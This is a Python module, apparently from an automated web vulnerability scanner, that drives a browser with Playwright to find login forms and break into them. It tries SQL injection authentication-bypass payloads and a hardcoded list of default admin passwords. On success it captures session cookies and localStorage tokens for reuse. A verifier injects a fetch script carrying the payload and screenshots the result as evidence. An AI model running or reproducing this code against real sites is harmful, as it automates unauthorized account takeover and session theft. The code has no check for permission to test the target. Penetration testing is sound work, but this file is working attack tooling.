from playwright.sync_api import Page, sync_playwright
import base64
import time
from src.core.logger import setup_logger

class AuthHandler:
    def __init__(self, logger=None):
        self.logger = logger or setup_logger("AuthHandler")
        self.cookies = None
        self.auth_token = None # สำหรับเก็บ JWT หรือ Bearer Token ใน SPA
        self.default_creds = [
            ("admin", "admin"), ("admin", "password"),
            ("root", "root"), ("user", "user"),
            ("admin", "admin123"), ("admin", "123456")
        ]

    def find_and_login(self, page: Page, creds: dict) -> bool:
        """ตรวจหาฟอร์มและพยายาม Login ด้วย Credential ที่ให้มา"""
        # เคลียร์ปลาเตอร์เตือนต่างๆ ก่อน (ถ้ามีใน context ของ crawler)
        password_input = page.locator('input[type="password"]')
        
        if password_input.count() > 0:
            self.logger.info(f"[Auth] 🕵️ Potential login form detected at {page.url}")
            return self.login_with_heuristics(page, creds)
        
        # ลองหาปุ่ม Login เพื่อนำทางไปหน้า Login
        login_indicators = 'a:has-text("Login"), a:has-text("Sign in"), button:has-text("Login"), .login-btn'
        login_btn = page.locator(login_indicators).first
        if login_btn.is_visible():
            try:
                login_btn.click()
                page.wait_for_load_state("networkidle")
                return self.login_with_heuristics(page, creds)
            except: pass
            
        return False

    def login_with_heuristics(self, page: Page, creds: dict) -> bool:
        """กรอกข้อมูล Login โดยใช้การเดา Selector"""
        try:
            user_selector = 'input[type="text"], input[type="email"], input[name*="user"], input[id*="email"]'
            user_input = page.locator(user_selector).first
            pass_input = page.locator('input[type="password"]').first
            submit_btn = page.locator('button[type="submit"], input[type="submit"], button:has-text("Login"), button:has-text("Log in")').first

            if user_input.is_visible() and pass_input.is_visible():
                user_input.fill(creds.get("username", "admin"))
                pass_input.fill(creds.get("password", "admin"))
                
                # คลิกและรอ Navigation
                with page.expect_navigation(timeout=8000, wait_until="networkidle"):
                    submit_btn.click()
                
                if self._check_success(page):
                    self._capture_session(page)
                    self.logger.info("[Auth] ✅ Login Successful!")
                    return True
        except Exception as e:
            self.logger.debug(f"[Auth] Heuristic Login failed: {e}")
        return False

    def aggressive_entry(self, page: Page) -> bool:
        """พยายามเจาะเข้าหน้า Login เมื่อไม่มีรหัสผ่าน"""
        if page.locator('input[type="password"]').count() == 0:
            return False

        self.logger.info(f"[Auth] 🛡️ Attempting Aggressive Entry at {page.url}")
        
        if self._try_sqli_bypass(page): return True
        if self._try_default_creds(page): return True
        return False

    def _try_sqli_bypass(self, page: Page) -> bool:
        payloads = ["' OR 1=1 --", "' OR '1'='1", '" OR 1=1 --']
        user_input = page.locator('input[type="text"], input[type="email"]').first
        pass_input = page.locator('input[type="password"]').first
        submit_btn = page.locator('button[type="submit"], input[type="submit"]').first

        for payload in payloads:
            try:
                self.logger.info(f"[Auth] Testing SQLi: {payload}")
                user_input.fill(payload)
                pass_input.fill(payload)
                
                with page.expect_navigation(timeout=5000):
                    submit_btn.click()

                if self._check_success(page):
                    self._capture_session(page)
                    return True
                page.goto(page.url) # Reset state
            except: continue
        return False

    def _capture_session(self, page: Page):
        """เก็บ Session ข้อมูลเพื่อใช้ Persistence"""
        self.cookies = page.context.cookies()
        # เก็บ LocalStorage เผื่อเป็นแอปแบบ JWT (SPA)
        self.auth_token = page.evaluate("() => JSON.stringify(localStorage)")
        self.logger.debug("[Auth] Session captured and stored.")

    def apply_session(self, context):
        """ใช้ฟังก์ชันนี้ใน Crawler เพื่อโหลด Session ที่เคย Login แล้ว"""
        if self.cookies:
            context.add_cookies(self.cookies)
            # หมายเหตุ: LocalStorage ต้องยัดผ่าน page.evaluate หลังจากเปิดหน้าแรก
            return True
        return False

    def _check_success(self, page: Page) -> bool:
        # เพิ่มการเช็ค URL Change และ Response Status
        # และเช็ค Cookies ที่เปลี่ยนไป (เช่น มี session id ใหม่เกิดขึ้น)
        indicators = ["logout", "sign out", "dashboard", "settings", "profile"]
        has_indicator = any(ind in page.content().lower() for ind in indicators)
        
        # เช็คว่า URL เปลี่ยนจากหน้า /login หรือไม่
        is_not_login_url = "login" not in page.url.lower()
        
        return has_indicator and is_not_login_url

    def verify_sqli_bypass(self, url: str, method: str, param_key: str, payload: str, content_type: str):
        """ตรวจสอบและถ่ายรูปหลักฐาน (Verifier Module)"""
        self.logger.info(f"[VERIFIER] Verifying SQLi Bypass at {url}")
        result = {"confirmed": False, "screenshot": None}

        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(channel="chrome", headless=True)
                context = browser.new_context(ignore_https_errors=True)
                page = context.new_page()

                fetch_script = self._generate_fetch_script(url, method, param_key, payload, content_type)
                page.goto(url) # เปิดหน้าเป้าหมายก่อน
                page.evaluate(fetch_script)
                
                page.wait_for_load_state("networkidle")
                time.sleep(2) # รอ Redirect

                if self._check_success(page):
                    result["confirmed"] = True
                    # ใส่ Overlay เพื่อความชัดเจนในรายงาน
                    page.evaluate("""() => {
                        const div = document.createElement('div');
                        div.style = "position:fixed;top:0;width:100%;bg:red;color:white;z-index:9999;text-align:center;padding:10px;font-size:20px;background:rgba(255,0,0,0.8);";
                        div.innerText = "🚨 VULNERABILITY CONFIRMED: SQL INJECTION BYPASS";
                        document.body.appendChild(div);
                    }""")
                    result["screenshot"] = self._capture_evidence(page)

                browser.close()
        except Exception as e:
            self.logger.error(f"[VERIFIER] Error: {e}")
        return result

    def _capture_evidence(self, page: Page) -> str:
        try:
            return base64.b64encode(page.screenshot(full_page=False)).decode('utf-8')
        except: return None

    def _generate_fetch_script(self, url, method, param_key, payload, content_type):
        safe_payload = payload.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${")
        is_json = content_type.lower() == "json"
        
        return f"""
        (async () => {{
            const options = {{
                method: '{method.upper()}',
                headers: {{ 'Content-Type': '{ 'application/json' if is_json else 'application/x-www-form-urlencoded' }' }},
                body: { f'JSON.stringify({{ "{param_key}": `{safe_payload}` }})' if is_json else f'new URLSearchParams("{param_key}=" + `{safe_payload}`) ' }
            }};
            const resp = await fetch('{url}', options);
            const text = await resp.text();
            document.open(); document.write(text); document.close();
        }})();
        """